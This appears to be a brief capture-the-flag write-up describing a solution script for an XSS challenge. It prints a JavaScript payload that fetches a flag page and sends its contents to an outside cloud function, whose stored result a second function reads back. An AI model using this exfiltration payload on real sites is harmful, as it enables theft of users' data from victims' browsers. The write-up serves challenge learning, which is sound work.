If you run ``solution.py``, it will create a payload, send it to the challenge and display the flag it exfiled. 

The payload created is, 
```
var xhr = new XMLHttpRequest()
xhr.open('GET','/xss-one-flag',true)
xhr.onload = function () {
	var request = new XMLHttpRequest()
	request.open('GET','https://us-central1-arboretum-backend.cloudfunctions.net/store-flag?flag=' + xhr.responseText,true)
	request.send()
}
xhr.send(null)
```

This will create an XHR request to fetch the flag and will send it to a cloud function I've set-up at ``https://us-central1-arboretum-backend.cloudfunctions.net/store-flag``. 

This cloud function will push the flag into a pubsub topic that you can read using another cloud function, ``https://us-west1-arboretum-backend.cloudfunctions.net/print-flag``.